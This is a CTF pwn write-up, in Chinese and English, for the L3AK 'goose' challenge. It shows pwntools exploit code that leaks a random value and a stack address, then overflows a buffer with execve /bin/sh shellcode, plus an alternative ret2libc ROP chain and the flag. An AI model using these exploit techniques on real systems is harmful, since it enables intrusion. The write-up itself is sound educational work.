# 1.0 Challenge
1. how to predict the rand ?
2. Python’s way of **getting the first byte as an integer**.
3. what position to format string
4. ret2libc or ret2shellcode
5. how to find buffer address
6. why need asm nop in shellcode

# 2.0 Analysis

CODE FLOW
write ur name
```
__int64 setuser()
{
  puts(
    "Welcome to the goose game.\n"
    "Here you have to guess a-priori, how many HONKS you will receive from a very angry goose.\n"
    "Godspeed.");
  printf("How shall we call you?\n> ");
  return __isoc99_scanf("%64s", username);
}
```

find random number -> next level
```
_BOOL8 guess()
{
  int v1; // [rsp+8h] [rbp-8h] BYREF
  int i; // [rsp+Ch] [rbp-4h]

  v1 = 0;
  i = 0;
  printf(
    "%s\n\nso %s. how many honks?",
    "\n"
    "                                                        _...--. \n"
    "                                        _____......----'     .' \n"
    "                                  _..-''                   .' \n"
    "                                .'                       ./ \n"
    "                        _.--._.'                       .' | \n"
    "                     .-'                           .-.'  / \n"
    "                   .'   _.-.                     .     ' \n"
    "                 .'  .'   .'    _    .-.        / `./  : \n"
    "               .'  .'   .'  .--' `.  |    |`. |     .' \n"
    "            _.'  .'   .' `.'       `-'    / |.'   .' \n"
    "         _.'  .-'   .'     `-.            `      .' \n"
    "       .'   .'    .'          `-.._ _ _ _ .-.    : \n"
    "      /    /o _.-'               .--'   .'      | \n"
    "    .'-.__..-'                  /..    .`    / .' \n"
    "  .'   . '                       /.'/.'     /  | \n"
    " `---'                                   _.'   ' \n"
    "                                       /.'    .' \n"
    "                                        /.'/.' \n",
    username);
  __isoc99_scanf("%d", &v1);
  putchar(10);
  for ( i = 0; i < nhonks; ++i )
    printf(" HONK ");
  putchar(10);
  return v1 == nhonks;
}
```

next level have more input 
```
int highscore()
{
  char buf[128]; // [rsp+0h] [rbp-170h] BYREF
  char s[128]; // [rsp+80h] [rbp-F0h] BYREF
  _BYTE v3[32]; // [rsp+100h] [rbp-70h] BYREF
  char format[80]; // [rsp+120h] [rbp-50h] BYREF

  strcpy(format, "wow %s you're so good. what message would you like to leave to the world?");
  printf("what's your name again?");
  __isoc99_scanf("%31s", v3);
  s[31] = 0;
  sprintf(s, format, v3);
  printf(s);
  read(0, buf, 0x400u);
  return printf("got it. bye now.");
}
```
# 3.0 Solution

前期准备
```
# -*- coding: utf-8 -*-
from pwn import*
context.log_level='debug'
context.arch='amd64'
context.os = "linux"
 
pc = "./chall_patched"

scripts = """
break *highscore+281
"""
 
if __name__ == '__main__':
    local = sys.argv[1]
    if local == '1':
        r= process(pc)
        elf = ELF(pc)
        libc = elf.libc
    else:
        r=remote("34.45.81.67",16004)
        elf = ELF(pc)
        libc = elf.libc
 
sa = lambda s,n : r.sendafter(s,n)
sla = lambda s,n : r.sendlineafter(s,n)
sl = lambda s : r.sendline(s)
sd = lambda s : r.send(s)
rc = lambda n : r.recv(n)
rl = lambda n : r.recv(n)
ru = lambda s : r.recvuntil(s)
ti = lambda: r.interactive()
lg = lambda s: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
bhex = lambda b: int(b.decode(), 16)
dbg = lambda: gdb.attach(r)
dbgstart = lambda script=scripts: gdb.attach(r, gdbscript=script)
```

## 3.1 LEAK RAND 
因为scanf("%64s", username);
没有null terminate 所以如果我们刚刚好 64个 没有\x00
就会带出下一个byte which continue printing until it finds a `\x00`

所以 b'a' * 64 可以看到 多出一个 ) 
![[./attachments/Pasted image 20250715004319.png]]

问题来了 怎样转成 int 
-> Python’s way of **getting the first byte as an integer**.
`guess = rc(1)[0]` 就ok 了 ????
第一次知道

```python
# dbgstart()
# p = b'a'*0x20
# leak random number  
sla("> ",b'a'*64)
ru(b'a'*64)
guess = rc(1)[0]
print("guess here >>",guess)
sla("honks?", str(guess).encode())
```

## 3.2 FORMAT STRING
what position to format string ????
为什么有 FS
![[./attachments/Pasted image 20250715004658.png]]
这个很搞笑 我直接 %p
然后就有
![[./attachments/Pasted image 20250715004719.png]]
然后就 gdb 找 这个是什么 tele xxxx
他是一个stack leak 没有什么用
这种时候 只能靠 offset 了
先把他变美美
```python
# format string
payload = b'%p %p %p %p %p %p %p %p'
sla("again?",payload)
ru("wow ")

# leak info
stack_leak = bhex(rc(14))
print("leak >>>", hex(stack_leak))
# dbg()
```

如果有leak 要想的是 ret2libc or ret2shellcode (NO NX)

ROP 我不会也找不到 libc 所以就算 shellcode
## 3.3 FIND BUFFER ADDRESS
how to find buffer address
开 dbgstart() 定位read 然后 send aaaabbbb
![[./attachments/Pasted image 20250715005607.png]]
算offset 罢了 leak - buf = 0x150, stack leak - 0x150 就是 buf 了
```python
# leak info
stack_leak = bhex(rc(14))
print("leak >>>", hex(stack_leak))
# dbg()
sla("world?",b'aaaabbbb')
buf = 0x7ffd13969b20
leak = 0x7ffd13969c70
shellcode_offset =  leak - buf
shellcode_address = stack_leak - shellcode_offset
print("offset >>>",shellcode_offset)
print("shell addr >>>",hex(shellcode_address))
```

## 3.4 SHELLCODE FORMAT
rmb the ret2shellcode format 一定要记得有这个东西 
shellcode + (offset  - len(shellcode)) + 8 + buffer address (where shellcode save)
我发现两个都可以用 然后 arch 要 amd64
```python
# shellcode + (offset  - len(shellcode)) + 8 + buffer address (where shellcode save)
shellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'
# shellcode = asm(shellcraft.sh())

# self shellcode payload 
payload = shellcode
payload += b'a'*(0x170 + 8 -len(shellcode))
payload += p64(shellcode_address)

```
4. why need asm nop in shellcode -> 感觉是不需要 可是 有人用 就 ok ?
```
# w2 payload
# payload = asm('nop')*100
# payload += shellcode
# payload += b'a'*(0x170 +8 - 100 -len(shellcode))
# payload += p64(stack_leak-0x150)
```

3.5 ROP
IF CHOOSE ROP
```python
libc_leak = int(ru(b" ", True), 16) - 0x93975
log.success(f"Libc leak: {libc_leak:#x}")
libc.address = libc_leak

pop_rdi = libc_leak + 0x10f75b
ret     = libc_leak + 0x10f75c
binsh   = next(libc.search(b"/bin/sh\0"))

payload = flat(
    b"A" * 0x178,
    pop_rdi,
    binsh,
    ret,
    libc.sym.system
)
sa(b"world?", payload)
```

# 4.0 FLAG 
find / -name * flag*
cat /flag

L3AK{H0nk_m3_t0_th3_3nd_0f_l0v3}

# 5.0 FULL SCRIPT
![[./attachments/c2 2.py]]

## 6.0 REFERENCE 
https://mindcrafters.xyz/writeups/leak-pwn/
https://m4nj4r0.github.io/blog/posts/l3akctf-2025--pwn/#the-goose